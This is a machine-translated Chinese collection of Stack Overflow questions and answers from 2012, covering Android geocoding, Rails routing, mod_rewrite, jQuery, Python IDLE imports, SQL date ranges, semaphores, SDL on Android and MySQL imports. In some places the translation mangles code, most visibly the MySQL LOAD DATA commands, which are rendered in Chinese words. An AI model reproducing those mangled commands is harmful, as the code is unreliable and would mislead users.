    List<Address> addresses = null;
    try {
        addresses = geocoder.getFromLocation(lat, lon, 1);
        if (!addresses.equals(null)) {
            Address returnedAddress = addresses.get(0);
            StringBuilder strReturnedAddress = new StringBuilder("\n");
            for (int i = 0; i < returnedAddress.getMaxAddressLineIndex(); i++) {
                strReturnedAddress
                        .append(returnedAddress.getAddressLine(i)).append(
                                "\n");
            }
            ret = "Around: " + strReturnedAddress.toString();
        } else {
            ret = "No Address returned!";
        }
    } catch (IOException e) {
        e.printStackTrace();
        ret = "Location: https://maps.google.co.in/maps?hl=en&q=" + lat
                + "," + lon;
    } catch (NullPointerException e) {
        e.printStackTrace();
        ret = lat + "," + lon;
    }
    return ret;
} 
```

并且还在 AndroidManifest 中添加这些权限：

```
<uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
<uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" /> 
```

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2012-05-27T09:14:09.610

[谷歌地方 API](http://code.google.com/apis/maps/documentation/places/)。

网址::

[https://maps.googleapis.com/maps/api/place/search/json?location=-33.8670522,151.1957362&radius=500&types=food&name=harbour&sensor=false&key=AddYourOwnKeyHere](https://maps.googleapis.com/maps/api/place/search/json?location=-33.8670522,151.1957362&radius=500&types=food&name=harbour&sensor=false&key=AddYourOwnKeyHere)

需要更改纬度、经度、半径、类型、名称和键。

**注意：：**需要注册开发者预览版。

# ruby-on-rails - 找不到没有和 id 的 [model]，Rails 3.2.3

> ID：10772834
> 
> 赞同：0
> 
> 时间：2012-05-27T09:09:04.737
> 
> 标签：ruby-on-rails, ruby-on-rails-3

我已按照说明操作并尝试为 Rails 3.2.3 安装[simple-private-messages](https://github.com/jongilbraith/simple-private-messages) gem。

我知道有很多关于“找不到没有 id 的 [model]”的问题，但它们有点老了，我无法使任何其他问题中发布的解决方案/想法起作用。

我发现这个问题中使用了相同的问题和相同的 gem [，](https://stackoverflow.com/questions/10217166/cant-find-user-without-id-form-error-in-rails-3-project#comment14004559_10217166)但没有提供明确的答案。我也认为问题不是由特定的宝石引起的。

我为安装插件所做的步骤：

```
Added plugin to gemfile, ran bundle install
rails generate simple_private_messages:model User Pmessage
Added this line to user.rb : has_private_messages :class_name => "Pmessage"
rails generate simple_private_messages:scaffold User Pmessage
Uncommented this line in pmessage.rb : attr_accessor :to 
```

然后我将它添加到我的 routes.rb 中：匹配'/pmessages'，到：'pmessages#index'

访问 /pmessages 会导致此错误消息：

> PmessagesController#index 中的 ActiveRecord::RecordNotFound 找不到没有 ID 的用户 Rails.root: /home/user/RoR/railsapp app/controllers/pmessages_controller.rb:59:in `set_user'

pmessages_controller 包含一个**set_user**方法，它是问题的根源。

```
private
  def set_user
    @user = User.find(params:[user_id])
  end 
```

我有一个 id=1 的有效用户记录，但是将麻烦的行更改为**@user = User.find(1)**并访问 /pmessages 会导致以下错误消息：

> 显示 /home/user/RoR/railsapp/app/views/pmessages/_inbox.html.erb 其中第 26 行提出：未定义的方法 `login' for #User:0xab4dc3c 提取的源代码（在第 26 行附近）：

以这种方式或任何其他方式为 User 赋值仍然会导致相同的错误消息：

```
@user = User.first 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-27T09:30:14.130

首先，你的路线应该像

```
resources :users do
  resources :pmessages
end 
```

所以`user_id`每个请求都有`/users/:user_id/pmessages`.

或者，您的`set_user`方法可能如下所示：

```
def set_user
  @user = current_user
end 
```

所以`@user`总是指向当前用户（并且路由仍然可以是你设置的）。

其次，您的`User`模型没有称为登录的字段。如果您的模型中有`username`属性，您可以将其添加到模型中：`alias_attribute :login, :username`或者如果您希望电子邮件为 login: `alias_attribute :login, :email`。

# apache - Mod_rewrite。带有特殊字符（问号）的重定向网址

> ID：10772835
> 
> 赞同：2
> 
> 时间：2012-05-27T09:09:12.400
> 
> 标签：apache, mod-rewrite, special-characters, http-status-code-301

我有一个带有 joomla 的网站，我需要重定向（301）一些链接

它们采用这种形式（index.php?Itemid= 识别它们 - 不应该重定向所有没有此部分的链接）

```
/index.php?Itemid=544&catid=331:savona&id=82356:smembramento-dei-cantieri-baglietto-di-varazze-lopposizione-delle-maestranze&option=com_content&view=article 
```

这应该工作

```
RewriteRule ^index.php?Itemid(.*)$ http://www.ligurianotizie.it/archive/index.php?Itemid$1 [L,R=301] 
```

但第一个？（问号）似乎会引起问题。

事实上，如果*我们假设*链接**没有**问号

```
/index.phpItemid=544&catid=331:savona&id=82356:smembramento-dei-cantieri-baglietto-di-varazze-lopposizione-delle-maestranze&option=com_content&view=article 
```

我会用

```
RewriteRule ^index.phpItemid(.*)$ http://www.ligurianotizie.it/archive/index.php?Itemid$1 [L,R=301] 
```

一切都很完美。但不幸的是，真正的链接有那个问号，我必须找到一个解决方案。

我和那个问号有什么关系？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-27T10:14:52.583

`?`角色逃脱了吗？尝试`NE`像这样添加 (noescape) 标志：

```
RewriteRule ^index.php?Itemid(.*)$ http://www.ligurianotizie.it/archive/index.php?Itemid$1 [L,R=301,NE] 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-27T12:51:25.280

这应该可以帮助您：

```
RewriteEngine On
RewriteBase /
RewriteCond %{QUERY_STRING} Itemid
RewriteRule ^index.php(.*)$ http://www.ligurianotizie.it/archive/index.php$1 [L,R=301] 
```

每个包含“Itemid”的链接都会被重定向，其他的不会。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-27T10:25:41.170

问号后面的部分是查询字符串。您可以使用`RewriteCond`它来确定它是否不为空，并据此做出重定向的决定。

> 注意：查询字符串
> 
> 模式不会与查询字符串匹配。相反，您必须使用带有 %{QUERY_STRING} 变量的 RewriteCond。但是，您可以在包含查询字符串部分的替换字符串中创建 URL。只需在替换字符串中使用问号，即可指示应将以下文本重新注入到查询字符串中。当您想删除现有的查询字符串时，只用问号结束替换字符串。要将新查询字符串与旧查询字符串组合，请使用 [QSA] 标志。

来源：[http ://httpd.apache.org/docs/2.0/mod/mod_rewrite.html](http://httpd.apache.org/docs/2.0/mod/mod_rewrite.html)

# javascript - jquery resizable插件，根据拖动边设置minWidth

> ID：10772843
> 
> 赞同：2
> 
> 时间：2012-05-27T09:11:05.590
> 
> 标签：javascript, jquery, jquery-ui, jquery-plugins

所以我有一个图像，它周围是一个裁剪标记，我不希望能够将裁剪标记调整为小于图像的大小。

为此，我需要设置裁剪标记的 minWidth，这取决于用户从哪一侧调整大小（到处都有一个句柄：n、ne、e、se 等）

我的问题是：如何实现这一目标？（我附上了一张图片，让我的问题更清楚一点）

此外，这是一个演示问题的[jsfiddle](http://jsfiddle.net/tvm6X/)。

![在此处输入图像描述](../Images/c4837b37d0f15a778699abe7152afe2a.png)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-27T17:49:39.770

看起来你两次发布了这个问题。这是我对[另一个问题](https://stackoverflow.com/questions/10775703/jquery-resize-plugin-min-width-depending-on-which-edge-is-being-dragged/10776001#10776001)的回答：有点奇怪的交互，但在这里（[jsfiddle](http://jsfiddle.net/mLw3Q/)）

```
$(function() {
    $( "#resizable" ).resizable({
        handles : 'e, n, s, w',
        resize : function(event, ui){
            switch($(this).data('resizable').axis)
            {
                case 'n':
                    $(this).resizable( "option", "minHeight", 75 );
                    break;
                case 's':
                    $(this).resizable( "option", "minHeight", 100 );
                    break;
                case 'e':
                    $(this).resizable( "option", "minWidth", 150 );
                    break;
                case 'w':
                    $(this).resizable( "option", "minWidth", 200 );
                    break;
            }
        }
    });
});​ 
```

# python - 导入使用原始文件，但不在 IDLE 中

> ID：10772847
> 
> 赞同：1
> 
> 时间：2012-05-27T09:11:22.210
> 
> 标签：python, import, python-idle, pywikibot

**更新 10 秒后**
现在正确修复，感谢 JF 和 Gauden。

**更新**
我通过将空闲文件保存在另一个工作文件所在的目录中找到了一个临时修复。（如果可以的话，我仍然想知道如何完全修复它。）

这不是永久修复，因此，如果您想尝试帮助使其在保存文件的任何地方都能正常工作，请随意。

这是一个 python 文件的开始：

```
#!/usr/bin/python
# -*- coding: utf-8  -*-
import wikipedia
import pagegenerators
import sys
import re
import pywikibot
from pywikibot import * 
```

（您可能已经注意到这是一个 pywikipedia 脚本，但我认为这无关紧要）

该文件从命令行运行良好。

但是，当我尝试使用 IDLE 开发脚本，或者只使用 IDLE 解释器时，我得到一个错误：

```
>>> import wikipedia

Traceback (most recent call last):
  File "<pyshell#9>", line 1, in <module>
    import wikipedia
ImportError: No module named wikipedia 
```

我真的不知道为什么它不起作用。

我也试过这个：

```
>>> imp.find_module("wikipedia.py","f:/ake/pa/th/")

Traceback (most recent call last):
  File "<pyshell#7>", line 1, in <module>
    imp.find_module("wikipedia.py","f:/ake/pa/th/")
ImportError: No frozen submodule named f:/ake/pa/th/.wikipedia.py 
```

错误日志中给出的路径是 wikipedia.py 文件的正确路径，`.`之前就是`wikipedia.py`.

然后我尝试将路径添加到`sys.path`，但这也不起作用：

```
>>> import sys
>>> sys.path.append("c/users/adam/py")
#the same error... 
```

**模块路径：** `c:\users\joe_bloggs\py\wikipedia.pyc

**Python 可执行文件:**命令行: `C:\Python27\python.exe`, IDLE:`C:\Python27\pythonw.exe`

**PYTHONPATH**两者都抛出：

```
Traceback (most recent call last):
  File "<pyshell#20>", line 1, in <module>
    print os.environ['PYTHONPATH'].split(os.pathsep)
  File "C:\Python27\lib\os.py", line 423, in __getitem__
    return self.data[key.upper()]
KeyError: 'PYTHONPATH' 
```

**操作系统：** Windows 7

**Python版本：** 2.7.2

**一个新的 PATH**：IDLE 和命令行：

```
C:\Program Files\Common Files\Microsoft Shared\Windows Live
C:\Program Files (x86)\Common Files\Microsoft Shared\Windows Live
C://Python27
C:\Program Files (x86)\IVI Foundation\VISA\WinNT\Bin
C:\Program Files (x86)\QuickTime\QTSystem\
C:\Program Files (x86)\Windows Live\Shared 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-27T09:23:30.863

**编辑**上述问题的答案被证明是相当简单的，但我正在编辑这个答案作为可能的故障排除清单以供将来参考，并作为其他可能需要在未来准备此类问题的人的清单。

## CLUE 1：您要导入的模块的路径是什么？

```
>>> import wikipedia
>>> print wikipedia.__file__ 
```

这将为您提供编译模块的路径，并且是一条线索。

## 线索 2：Python 可执行文件的路径是什么？

（[另见这个问题](https://stackoverflow.com/questions/2589711/find-full-path-of-python-interpreter)）。

```
>>> import sys
>>> print sys.executable 
```

在 shell 和 IDLE 脚本中试试这个。如果这两个结果不同，那么您正在使用两个 Python 解释器，并且其中只有一个具有指向`wikipedia`模块的路径。

## 线索3：什么是`sys.path`？

还要在 shell 和 IDLE 中作为脚本重复此操作。

```
>>> print '\n'.join( sys.path ) 
```

（您可以使用`sys.path.append("d:/irectory/folder/is/in")`将该位置添加到`sys.path`. 这应该将该目录添加到 Python 查找模块的位置列表中。）

## 线索 4：什么是 PYTHONPATH，它在两种环境中有何不同？

（[另见这个答案](https://stackoverflow.com/a/1489625/1290420)）。

最后在 shell 和 IDLE 中作为脚本重复此操作。

```
>>> import os
>>> print '\n'.join( os.environ['PATH'].split(os.pathsep) ) 
```

再次注意两个结果（来自 shell 和来自 IDLE），并查看两个环境中的 PYTHONPATH 是否存在差异。

如果所有这些测试都证明没有结果，我会尽可能多地在您的问题中添加这些信息，因为这将有助于为您提供具体的进一步线索。还要添加您正在使用的操作系统以及您获得的任何回溯。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2016-08-21T15:03:07.577

尝试在我的 Raspberry Pi 上导入新安装的库时，我遇到了同样的问题。我按照所有说明安装库（[Adafruit RHT Sensor](https://learn.adafruit.com/dht-humidity-sensing-on-raspberry-pi-with-gdocs-logging/software-install-updated "Adafruit RHT 传感器")），它在终端上运行良好。但是，我无法让它在 IDLE 中工作。

事实证明，问题在于 Raspberry Pi 同时安装了 Python 2 和 3。我完成的安装（使用“python”命令）仅适用于 Python 2。我必须使用“python3”命令执行另一次安装才能为 Python 3 安装它。之后，我重新启动了 IDLE，一切正常。

上面打印 sys 可执行路径的建议有助于指出差异：

```
import sys
print sys.executable 
```

# android - 多行编辑文本

> ID：10772853
> 
> 赞同：1
> 
> 时间：2012-05-27T09:12:24.497
> 
> 标签：android, android-edittext, multiline

我正在开发一个历史计算器，我希望`EditText`在每次单击等号按钮后我的最后一行向上移动。这可能吗？我在主xml中设置了以下代码

```
<EditText android:layout_width="fill_parent"
        android:layout_height="wrap_content" 
        android:gravity="center"
        android:singleLine="false" 
        android:lines="5"
        android:layout_marginLeft="10dip" 
        android:layout_marginRight="10dip"/> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-27T09:20:05.683

在等于按钮的单击事件上只有这个代码

```
edittext.setText(edittext.getText()+"\n"+your_result_of_calculation); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-27T09:16:00.673

呃！根据您的要求，我认为您可以通过将 ' \n ' 附加到现有文本来做到这一点。

# uiviewcontroller - xcode：为 StoryBoard 中的选项卡项创建 viewController 会导致黑屏

> ID：10772858
> 
> 赞同：0
> 
> 时间：2012-05-27T09:12:58.210
> 
> 标签：uiviewcontroller, storyboard, segue, tabview, uitabview

我的故事板中有一个标签栏控制器。我添加了第三个视图控制器，为它创建了一个选项卡链接（segue）。当我运行该应用程序时，第三个选项卡完美地显示了它的所有对象。接下来，我创建了一个 ThirdViewController.m 和 .h 文件。在 Identity Inspector 中，我将第三个选项卡项的类设置为 ThirdViewController。当我运行应用程序时，第三个选项卡项只显示黑屏？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-27T09:21:50.723

移除 Xcode 在视图控制器中添加的 loadView 方法。在这里采取的答案：[答案](https://stackoverflow.com/questions/9517886/new-viewcontrollers-causing-black-screen)

# html - 可拖动调整大小所需的文本区域中的最小高度

> ID：10772859
> 
> 赞同：5
> 
> 时间：2012-05-27T09:13:15.623
> 
> 标签：html, css, textarea

我的页面上有一个`textarea`。它有这个可拖动的角落，可以让我调整它的大小。就像在下面的屏幕截图中一样

![在此处输入图像描述](../Images/d1499fa9bca8a020c83874a5b0122414.png)

如果我将它调整得太小，角落会消失（即使角落仍然会让我调整 textarea 的大小）。

我想将最小高度设置为显示可拖动角图像所需的高度，以免混淆用户

这`minimum-height`需要什么？东西喜欢`padding`并`margin`影响它吗？它只是在 Chrome 中还是在 Safari/IE 中是一样的 .. 等？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-06-26T18:29:22.287

您应该能够在元素 cols 和 rows 中定义。喜欢这样做会创建最小尺寸。然后你可以从那里调整大小。或在 CSS 中

在 CSS 中，您可以设置最小和最大尺寸。适用于大多数现代浏览器

```
 #confinedSpace textarea { resize:vertical; max-height:300px; min-height:200px; }
  #confinedSpace textarea.horiz { resize:horizontal; max-width:400px; min-width:200px; } 
```

# linux - linux中的信号量和共享内存

> ID：10772860
> 
> 赞同：3
> 
> 时间：2012-05-27T09:13:19.390
> 
> 标签：linux, memory, semaphore, shared

我在如何同步 2 个进程方面有点问题。第一个进程必须创建一个共享内存，然后等待第二个进程填充共享内存并将其返回给第一个进程。我不知道如何让第一个进程等待。

这是我的流程的伪代码：

过程1：

```
create shared memory
create a semaphore
wait for the second process /* this part i dont know how to write */
output the shared memory 
```

过程2：

```
get shared memory id
get the semaphore id
wait();
fill the shared memory 
signalize(); 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-04T11:56:16.763

到目前为止，您是正确的。

正如您在问题中提到的那样，您正在使用信号量来回答您的问题。

在posix semaphore api中，您有 sem_wait() ，它将一直等到信号量计数的值为零，一旦使用来自其他进程的 sem_post 递增，等待将完成。

在这种情况下，您必须使用 2 个信号量进行同步。

**进程 1（阅读器）**
sem_wait(sem1);
…………

.......
sem_post(sem2);

**进程 2(writer)**
sem_wait(sem2);
.......
.......
sem_post(sem1);

这样就可以在共享内存中实现同步。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-27T09:21:16.010

This is hint and not an complete answer. Use condition variables. See [https://computing.llnl.gov/tutorials/pthreads/#ConditionVariables](https://computing.llnl.gov/tutorials/pthreads/#ConditionVariables), that explains how it works. You can work out the solution from there.

# javascript - 文本框有焦点时如何设置它的值

> ID：10772861
> 
> 赞同：0
> 
> 时间：2012-05-27T09:13:21.130
> 
> 标签：javascript, html

我有一个带有按键处理程序的文本框。处理程序检测您是否按了转义键，如果是，则意味着清除文本框值。但是，调用`tb.value = ""`正常工作，除非文本框有焦点，在这种情况下它什么也不做。我怀疑我必须选择文本并将其删除，但是如何？这是在 Firefox 12 中。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-27T09:33:37.583

看看这个：-

**[现场演示](http://jsfiddle.net/SivaCharan/qj5AN/1/)**

## HTML：

```
<input type="text" id="content" /> 
```

## JS：

```
$(document).keyup(function(e) {
    if (document.activeElement.nodeName == 'INPUT')
    {    
            if (e.keyCode == 13) {  // Enter
                alert('Enter Key Up');
            }   
            if (e.keyCode == 27) {  // Esc               
                    alert('Esc Key Up');
                    $('#content').val("");
            }
    }
}); 
```

# winforms - 使用 DateTimePicker 编辑日期

> ID：10772863
> 
> 赞同：0
> 
> 时间：2012-05-27T09:13:30.227
> 
> 标签：winforms, formatting, format

我可以使用 TAB 或箭头键 (MM-dd-yyyy) 编辑月份、日期和年份。我怀疑这是否可以一次编辑总日期格式（不使用制表键或任何箭头键）。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-27T12:37:56.797

不，我不认为这是可能的。从[使用 DateTimePicker 控件](http://msdn.microsoft.com/en-us/library/aa231249%28v=vs.60%29.aspx)

> DateTimePicker 用作用于输入日期和时间值的屏蔽编辑控件。日期或时间的每一部分都被视为控件编辑部分中的一个单独字段。当用户单击每个字段时，它会突出显示，他们可以使用向上和向下箭头键来增加或减少字段的值。如果适用，用户还可以直接在控件中键入值。

# android - Android：无法从图库中选择图像

> ID：10772864
> 
> 赞同：0
> 
> 时间：2012-05-27T09:13:37.357
> 
> 标签：android, cursor, gallery

我正在尝试从图库中挑选一张图片并将其设置为视图的背景。现在，只要照片在我的 SD 卡上，我就可以选择它们。但由于我的画廊与我的 picasa 相册同步，当我尝试选择其中一张照片时，光标返回 NULL。下面是我的代码。

```
 Uri selectedImage = imageReturnedIntent.getData();
            String[] filePathColumn = { MediaStore.Images.Media.DATA };

            Cursor cursor = managedQuery(selectedImage,
                    filePathColumn, null, null, null);
            cursor.moveToFirst(); 
```

所选图像的 URI 为“ [https://lh5.googleusercontent.com/-thIdOA38IO0/SY8GG8PqW4I/AAAAAAAABKA/f3XpPvY9JHo/s1024/Picture%252520007.jpg](https://lh5.googleusercontent.com/-thIdOA38IO0/SY8GG8PqW4I/AAAAAAAABKA/f3XpPvY9JHo/s1024/Picture%252520007.jpg) ”

有人可以帮忙吗？

谢谢！拉胡尔。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-27T09:29:44.150

```
Uri selectedImage = Uri.parse(imageReturnedIntent.getDataString()); 
```

尝试上面返回 selectedImage 的 Uri 的行。

# php - Cake PHP 站点在 localhost 上工作正常，但在服务器上时出错

> ID：10772868
> 
> 赞同：1
> 
> 时间：2012-05-27T09:14:35.213
> 
> 标签：php, cakephp

就是这样。我已经正常烘焙了蛋糕 php 应用程序。该站点在本地服务器上运行良好。但是当迁移到 bluehost 服务器时，它开始在 hasmany 中出现问题并且属于关联。我发现的问题基本上是在包含数据的数组中。例如 $comments 通常有数据

> Array ( [Comment] => Array ( [id] => 46 [name] => asddasd [email] => sdaa [网站] => asdasd [commentdata] => asdasd [postdate] => 2012-04-27 08 :20:00 [post_id] => 2 ) [Post] => Array ( [id] => 2 [title] => 战斗机 [category] ​​=> 军事 [description] => asddasdasdasdasdasd [body] => 你好是第二个[创建] => 2012-04-10 18:41:43 [修改] => 2012-04-27 13:25:33 [user_id] => 0) )

但在网络服务器上看起来像

> Array ( [Comment] => Array ( [id] => 8 [name] => ddasdasdsdasd [email] => asdasd [网站] => asdasd [commentdata] => adasdasdasdad [postdate] => 2012-04-23 23 :15:00 [post_id] => 8))

因此最终显示以下错误

未定义索引： Post [APP/View/Comments/index.ctp, line 24] 第24行是

```
 <?php echo $this->Html->link($comment['Post']['title'], array('controller' => 'posts', 'action' => 'view', $comment['Post']['id'])); 
```

请告诉解决这个问题？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-27T09:34:08.900

看看这个教程：[http](http://ad7six.com/2007/08/24/Production-setup-revisited.html) ://ad7six.com/2007/08/24/Production-setup-revisited.html 。我已经看到这个问题在这个网站上发布了很多，即：here: [Cakephp Install on Bluehost](https://stackoverflow.com/questions/1003128/cakephp-install-on-bluehost)和here: [Setting up cakephp 2.0 on bluehost](https://stackoverflow.com/questions/10543350/setting-up-cakephp-2-0-on-bluehost)

# sql - 以日期时间间隔展开表格

> ID：10772870
> 
> 赞同：3
> 
> 时间：2012-05-27T09:14:46.010
> 
> 标签：sql, sql-server, sql-server-2008, tsql, sql-server-2005

大家好，这几天我使用sql进行分析，遇到各种问题，感谢您的论坛，我解决了。

现在我想创建一个视图来恢复时间间隔并详细显示此间隔中的日期。

我有下表：

![在此处输入图像描述](../Images/50714c196f80b8e0c64a5dbf432f84ff.png)

我想创建显示结果的视图：

![在此处输入图像描述](../Images/576b6a97b1f19e7db5195175b8302b2d.png)

例如在 player1 MyTable 中从 01/01/2012 到 05/01/2012 播放五天。因此，视图显示 player1 的 5 行，日期为 01/01/2012、02/01/2012、03/01/2012、04/01/2012、05/01/2012。

预先感谢您的帮助。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-27T10:05:49.410

您必须创建一个为您提供日期范围的公用表表达式（我已经创建了当月的日期范围，但您可以选择另一个范围）：

```
WITH DateRange(dt) AS
(
SELECT CONVERT(datetime, '2012-01-01') dt
UNION ALL
SELECT DATEADD(dd,1,dt) dt FROM DateRange WHERE dt < CONVERT(datetime, '2012-01-31')
)

SELECT dates.dt AS DatePlaying, PlayerName 
FROM MyTable t
JOIN DateRange dates ON dt BETWEEN t.BeginDate AND t.DateEnd
ORDER BY PlayerName, DatePlaying 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-27T13:21:39.540

另一种方法是简单地创建一个枚举表来为日期添加值：

```
with enumt as (select row_number() over (order by (select NULL)) as seqnum
               from mytable
              )
select dateadd(d, e.seqnum, mt.DateBegin) as DatePlaying, mt.PlayerName
from MyTable mt join
     enum e
     on enumt.seqnum <= e.NumberOfPlayingDay 
```

“with”子句的唯一目的是生成从 1 开始的整数序列。

# c - 如何知道外部 DLL 是否进入函数？

> ID：10772873
> 
> 赞同：3
> 
> 时间：2012-05-27T09:15:01.890
> 
> 标签：c, windows, winapi

我有一个使用外部 DLL 的 Win32 应用程序（控制台应用程序）。DLL 导出两个函数（Run 和 SecretFunction），我需要知道 DLL 何时进入 SecretFunction。我在运行时加载 DLL（我通过命令行参数获取路径）。

我无法使用共享事件。

我得到的两个提示是对异常方法使用一些类似的逻辑，并且可能使用 VirtualQuery/VirtualProtect。

有人可以指出我正确的方向吗？

澄清：

我的程序将调用 Run 函数。Run 函数可能会也可能不会调用 SecretFunction。我想从我的程序中知道是否调用了 SecretFunction。

我有以下代码，所以我有函数的地址：

```
pfn_SecretFunction pfnSecretFunction = (pfn_SecretFunction)GetProcAddress(pluginDLLModule, "SecretFunction"); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-27T10:21:48.943

注入 DLL 并在要跟踪的函数中添加代码（监视器）。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-27T10:09:24.710

到达 (SecretFunction) 函数时在 DLL 中抛出异常，并在 exe（控制台）中捕获（并吞下）异常。

# android - 如何为 Android 构建 SDL 库

> ID：10772875
> 
> 赞同：1
> 
> 时间：2012-05-27T09:15:15.593
> 
> 标签：android, build, android-ndk, ffmpeg, sdl

我打算使用 SDL（简单 DirectMedia 层）在使用 ffmpeg 库的 Android 应用程序中显示视频输出。我已经从[http://www.libsdl.org/download-1.2.php](http://www.libsdl.org/download-1.2.php)下载了源代码，并在我的 Ubuntu 上构建了（./configure、make & make install）。但是当我使用这些 .so 文件时，Android ndk-build 会抱怨“无法读取符号。文件格式错误”。

我可以在 Android 上使用在 Ubuntu 上构建的 .so 文件，还是需要以不同的方式为 Android 构建 SDL？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-04T06:22:21.830

正如文中所写`README.android`

你需要在你的 jni 文件夹中添加一个指向该文件夹的符号链接`SDL`，在你`jni/src/Android.mk`确保你有这些行之后

```
SDL_PATH := ../SDL

LOCAL_C_INCLUDES := $(LOCAL_PATH)/$(SDL_PATH)/include

# Add your application source files here...
LOCAL_SRC_FILES := $(SDL_PATH)/src/main/android/SDL_android_main.cpp \
    main.c

LOCAL_SHARED_LIBRARIES := SDL

LOCAL_LDLIBS := -lGLESv1_CM -llog

include $(BUILD_SHARED_LIBRARY) 
```

这样，SDL 的 .so 将与您的项目一起为您的目标（当然是 ARM cpu）编译，并自动包含在最终的 .apk 中

当您执行 ./configure && make && make install 时，您实际上是在为计算机的 CPU 构建 .so（当然对于 x86 / x86_64）

# mysql - 加载数据文件导入不起作用，其他主题都没有帮助

> ID：10772876
> 
> 赞同：1
> 
> 时间：2012-05-27T09:15:16.977
> 
> 标签：mysql, csv, data-import

这是我要导入的表：

> ```
> create table if not exists Medici(
>     m_id int unsigned AUTO_INCREMENT PRIMARY KEY,
>     m_nume VARCHAR(50),
>     m_prenume VARCHAR(50),
>     Statut ENUM('primar', 'specialist'),
>     Specialitate VARCHAR(50) 
> ```
> 
> ) 引擎 = InnoDB 默认字符集 = utf8;

CSV 开头为：

*   Nume,Prenume,Tip,Specialitate
*   Bunica,Mihai-Daniel,primar,reumatologie
*   Donca，Cornelia-Ana，primar，chirurgie
*   Achiriloaie，Lorand-Levente，专家，神经病学

我写的代码是：

> 将文件 'D:/xxxxxxxxxxxxx/xxxxxxx/xxxxxxxxxx/xxxxxx/xxxxxxxxxx/medici.txt' 中的数据加载到表 Medici 字符集 utf8 字段中以 ',' 开头的行以 'Nume,Prenume,Tip,Specialitate\n' 结尾\n' (m_nume,m_prenume,Statut,Specialitate);

注意：我用 \n、\r、\r\n 更改终止，但我仍然得到 1 行。即使删除了终止的行，它也不起作用。

注意：我粘贴得很快，有点搞砸了，那里有 4 行。而且我认为它的格式正确的csv

等不及建议了，在此先感谢。

更多代码在这里：Nume,Prenume,Tip,Specialitate Bunica,Mihai-Daniel,primar,reumatologie Donca,Cornelia-Ana,primar,chirurgie Achiriloaie,Lorand-Levente,specialist,neurologie Papuc,Raducu-Liviu,primar,homeopatie Cucuiu ,Nutu,primar,ortopedie Buia,Tache,专家,ginecologie Dragomanu,Mitrut,专家,ecografie Ticu,Simona,专家,psihiatrie Ene,Adrian-Stefan,专家,pediatrie Copae,Toma,primar,neurologie Hotoi,Dragos Alin,专家,儿科 Ceafalau,Vincenţiu Mihail,primar,儿科 Briceag,Anca Stefana,primar,imagistica Condrea,Nutu,primar,fizioterapie Cruceru,Ioana-Loredana,primar,皮肤科 Soarece,Dan-Cristian,primar,orl Tatasel,Alexandru-Ovidiu,专家, psihologie Sterian,Gologaneanu,primar,chirurgie Postelnicu,Habib,primar,chirurgie Silviu,Adrian Ionut,primar,dermatologie Paius,Ioana,专家,ortopedie Borza,Marius Florian,专家,fizioterapie Tamas,Ciprian Costel,primar,chirurgie Ograzeanu,Cristina Alexandra,primar,endocrinologie Rildo,Alex,专家,ecografie

> 在 csv 中，这些行被合并（一行到另一行）例如：在 reumatologie 它以名称开头但是当我粘贴代码时，您可以看到它实际上是一个 \n Bunica,Mihai-Daniel,primar,reumatologieDonca,(.. ..这是第二行，依此类推）

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-27T09:37:26.763

试试这个命令：

> **加载数据本地infile**
> 
> 'D:/xxxxxxxxxxxxx/xxxxxxx/xxxxxxxxxx/xxxxxx/xxxxxxxxxx/medici.txt'
> 
> **进入以“，”**结尾的****表**Medici 字符集 utf8字段**
> 
>  ****以'\n'**终止的行****IGNORE 1 LINES** (m_nume,m_prenume,Statut,Specialitate);****

# java - 传递 XYPlot 的计时值

> ID：10772880
> 
> 赞同：0
> 
> 时间：2012-05-27T09:16:27.717
> 
> 标签：java, jfreechart, long-integer

我在使用时遇到问题`getTime()`。该方法是从另一个类传递并使用`System.currentTimeMillis()`. 有人能帮我吗？我真的很感谢你的帮助。谢谢你。

```
panelGraph = new JPanel();
panelGraph.setLayout(new BorderLayout());

aesDataset = XYDataset(caes.getTimeTotal());

JFreeChart chart = ChartFactory.createTimeSeriesChart(
    "Graph: Encrypted Result", "SetFile", "Time", aesDataset, true, true, false);

chart.setBackgroundPaint(Color.green);
XYPlot plot = (XYPlot) chart.getPlot();
plot.setOrientation(PlotOrientation.VERTICAL);
plot.setBackgroundPaint(Color.lightGray);
plot.setDomainGridlinePaint(Color.white);
plot.setRangeGridlinePaint(Color.white);
plot.setAxisOffset(new RectangleInsets(5.0, 5.0, 5.0, 5.0));

XYItemRenderer renderer = plot.getRenderer();
renderer.setSeriesPaint(0, Color.red);

NumberAxis yAxis1 = (NumberAxis) plot.getRangeAxis();
yAxis1.setTickLabelPaint(Color.red);

ChartPanel frame1 = new ChartPanel(chart);
frame1.setSize(400, 300);
panelGraph.add(frame1); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-27T01:00:00.987

使用`TimeSeriesCollection dataset = new TimeSeriesCollection();`而不是`XYDataset`. 然后将 TimeSeries 添加到数据集，`dataset.addSeries(timeSeries);` 其中 timeSeries 是一个对象，其列表为`TimeSeriesDataItem`.

